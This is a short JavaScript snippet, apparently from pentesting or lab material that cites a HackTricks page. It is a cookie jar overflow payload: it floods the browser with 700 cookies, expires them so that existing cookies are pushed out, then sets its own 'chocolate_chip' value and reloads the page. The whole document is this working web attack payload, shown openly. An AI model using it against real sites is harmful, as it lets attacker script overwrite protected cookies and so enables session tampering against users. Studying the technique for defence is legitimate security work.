// JS payload to overflow cookie jar. 
// More info here: https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow

    document.querySelector("button").addEventListener("click", function () {
        // Set many cookies
        for (let i = 0; i < 700; i++) {
            document.cookie = `cookie${i}=${i}`;
        }

        // Remove all cookies
        for (let i = 0; i < 700; i++) {
            document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
        }

        // Set our chocolate_chip cookie
        document.cookie = "chocolate_chip=overwritten by JavaScript";

        window.location.reload();
    });

